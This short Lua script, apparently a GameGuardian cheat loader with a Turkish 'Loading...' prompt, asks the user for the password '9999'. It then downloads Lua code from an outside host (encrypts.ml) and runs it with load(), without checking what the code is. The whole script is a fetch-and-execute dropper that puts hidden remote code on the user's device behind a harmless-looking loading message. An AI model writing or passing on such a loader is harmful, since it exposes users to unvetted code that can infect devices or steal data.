ANSHU = gg.prompt({
"Yükleniyor..."
 }, {}, {})
 if not ANSHU then
  os.exit()
end
if ANSHU[1] == "9999" then
gg.sleep(600)
else
gg.alert("Yuklenıyor")
os.exit()
end

local file = gg.makeRequest('https://encrypts.ml/@CU.lua')
if file.content == nil or file.content == '' then
os.exit()
end
local load =  load(file.content)
if load == nil then
os.exit()
end 
load()
